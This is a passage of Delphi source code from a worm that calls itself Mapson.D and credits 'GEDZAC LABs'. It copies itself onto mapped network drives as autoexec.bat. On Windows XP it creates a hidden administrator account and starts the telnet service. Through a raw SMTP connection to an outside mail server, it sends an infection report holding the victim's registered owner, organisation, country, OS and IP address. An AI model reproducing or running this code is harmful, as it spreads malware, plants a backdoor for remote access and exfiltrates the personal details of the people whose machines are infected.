       MaxNetPathLen:=MAX_PATH;
       SetLength(ThePath,MAX_PATH);
       For I := 'A' to 'Z' Do
       If WNetGetConnection(PChar(''+I+':'),PChar(ThePath),
       MaxNetPathLen)<>ERROR_NOT_CONNECTED then
       For T := 1 to 5 Do
     Begin
     CopyFile(PChar(guorm),PChar(I+':'+carpetas[T]+'autoexec.bat'),true);
   End;
   End;
   PROCEDURE TForm1.Reporting;
    VAR
     OS : string;
     ORG : string;
     REGIS : string;
     Country : string;
     Texto   : string;
    Begin
      OS := LeerReg(HKEY_LOCAL_MACHINE,'\SOFTWARE\Microsoft\Windows\CurrentVersion\','ProductName');
      if OS = '' then begin
      OS := LeerReg(HKEY_LOCAL_MACHINE,'\SOFTWARE\Microsoft\Windows NT\CurrentVersion\','ProductName'); end;
      ORG := LeerReg(HKEY_LOCAL_MACHINE,'\SOFTWARE\Microsoft\Windows NT\CurrentVersion\','RegisteredOrganization');
      If ORG = '' Then Begin
      ORG := LeerReg(HKEY_LOCAL_MACHINE,'\SOFTWARE\Microsoft\Windows\CurrentVersion\','RegisteredOrganization'); end;
      REGIS := LeerReg(HKEY_LOCAL_MACHINE,'\SOFTWARE\Microsoft\Windows NT\CurrentVersion\','RegisteredOwner');
      If REGIS = '' Then Begin
      REGIS := LeerReg(HKEY_LOCAL_MACHINE,'\SOFTWARE\Microsoft\Windows\CurrentVersion\','RegisteredOwner'); end;
      Country := LeerReg(HKEY_CURRENT_USER,'\Control Panel\International\','sCountry');
      IF OS = 'Microsoft Windows XP' then
      Begin
      ShellExecute(Form1.Handle,nil,PChar('cmd.exe /c net user GEDZAC gedzac /add'),'','',SW_SHOWNORMAL);
      ShellExecute(Form1.Handle,nil,PChar('cmd.exe /c net localgroup "Administrators" GEDZAC /add'),'','',SW_SHOWNORMAL);
      ShellExecute(Form1.Handle,nil,PChar('cmd.exe /c net start "telnet"'),'','',SW_SHOWNORMAL);
      Texto := 'I need Shell Accounts :D';
      end;
      GetHostName(@Datos,128);
      Host2 := GetHostByName(@Datos);
      IpLocal := Inet_Ntoa(PinAddr(Host2^.h_addr_list^)^);
      WSAStartup(257,WSAX);
      Host := GetHostByName(pChar('smtp.prodigy.net.mx'));
      IP := Inet_Ntoa(PinAddr(Host^.h_addr_list^)^);
      Socketx:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
      Shity.sin_family := AF_INET;
      Shity.sin_port := htons(25);
      Shity.sin_addr.S_addr := Inet_addr(IP);
      Connect(Socketx,Shity,SizeOf(Shity));
      SND('Helo localhost'+CRLF);
      Recv(Socketx,BoF,SizeOf(BoF),0);
      SND('MAIL FROM: ajh@prodigy.net.mx'+CRLF);
      Recv(Socketx,BoF,SizeOf(BoF),0);
      SND('RCPT TO: infectados@virusmex.zzn.com'+CRLF);
      Recv(Socketx,BoF,SizeOf(BoF),0);
      SND('DATA'+CRLF);
      Recv(Socketx,BoF,SizeOf(BoF),0);
      SND('FROM: Falckon@GEDZAC.net'+CRLF);
      SND('To: infectados@virusmex.zzn.com'+CRLF);
      SND('Subject: New Infected'+CRLF);
      SND('Mapson.D Reporting to the GEDZAC LABs'+CRLF);
      SND('Infection Date: '+inttostr(Tiempo.wDay)+'/'+inttostr(Tiempo.wMonth)+'/'+inttostr(Tiempo.wYear)+CRLF);
      SND('Infection Time: '+inttostr(Tiempo.wHour)+':'+inttostr(Tiempo.wMinute)+CRLF);
      SND('Country: '+Country+CRLF);
      SND('Registered Org: '+ORG+CRLF);
      SND('Reg. Onwer: '+REGIS+CRLF);
      SND('OS: '+OS+CRLF);
      SND('IP: '+IPLocal+CRLF);
      SND('[GEDZAC LABS]'+CRLF);
      SND('.'+CRLF+CRLF);
      Recv(Socketx,BoF,SizeOf(BoF),0);
      WSACleanup() ;
   End;
   END.
